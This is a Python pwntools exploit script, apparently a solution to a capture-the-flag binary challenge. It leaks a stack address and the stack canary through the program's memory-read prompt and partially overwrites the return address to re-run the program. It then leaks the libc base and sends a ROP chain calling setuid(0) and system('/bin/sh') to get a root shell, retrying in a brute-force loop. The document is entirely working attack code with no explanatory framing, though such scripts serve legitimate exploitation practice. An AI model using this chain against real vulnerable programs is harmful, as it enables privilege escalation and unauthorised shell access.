#!/bin/python

from pwn import * 
import sys
import time

context.arch = 'amd64'
context.log_level  = 'info'

FUNC_NAME="challenge"
BUFFER_LEN= 0x80-8

elf = None
rop = None
libc = None


def hex_leak(proc, addr_loc):
    proc.recvuntil("Address in hex to read from:\n")
    proc.sendline(hex(addr_loc))
    return int(proc.recvline(drop=True)[-16:], 16)


def stack_leak(proc):
    proc.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
    return int(proc.recvline(drop=True)[:-1], 16)


def get_payload(args, proc: process):
    global elf, rop, libc
    elf = proc.elf 
    rop = ROP(elf)

    if libc is None:
        libc = elf.libc
#    import IPython; IPython.embed()

    # First stage    
    leak_addr = stack_leak(proc)
    canary = hex_leak(proc, leak_addr + BUFFER_LEN)
    print("[+] Canary: " + hex(canary))

    # Repeat execution
    libc_main_off = libc.symbols['__libc_start_main']
    proc.send(flat([
            b'X' * BUFFER_LEN,
            canary,
            b'Y' * 8, #rbp
            p16(libc_main_off & 0x0FFFF),
    ]))

    time.sleep(0.1)
    if proc.poll() is not None:
         return '\x00'   
    

    # Second stage
    leaked_rip = 0
    try:
        leak_addr = stack_leak(proc)
        leaked_rip = hex_leak(proc, leak_addr + BUFFER_LEN + 16)
    except EOFError as _:
        exit(201)

    libc.address = (leaked_rip - libc_main_off)  & 0xFFFFFFFFF000
    print("[+] Libc base address: " + hex(libc.address))

    libc_rop = ROP(libc)
    sh_str = next(libc.search(b'/bin/sh'))
    libc_rop.setuid(0)
#        libc_rop.raw(libc_rop.ret)
    libc_rop.system(sh_str)

    print(f"[+] {libc_rop.dump()}")
    return flat([
        b'Z' * BUFFER_LEN,
        canary,
        b'T' * 8,
        libc_rop.chain()
    ])


def main():
    count = 1
    while True:
        if not count % 500:
            print("...")
            time.sleep(1)
        count += 1

        proc = process(sys.argv[1])
        payload = get_payload(None, proc)
        if proc.poll() is None:
            proc.send(payload)

        if proc.poll() is None:
            proc.interactive()


if __name__ == '__main__':
    main()
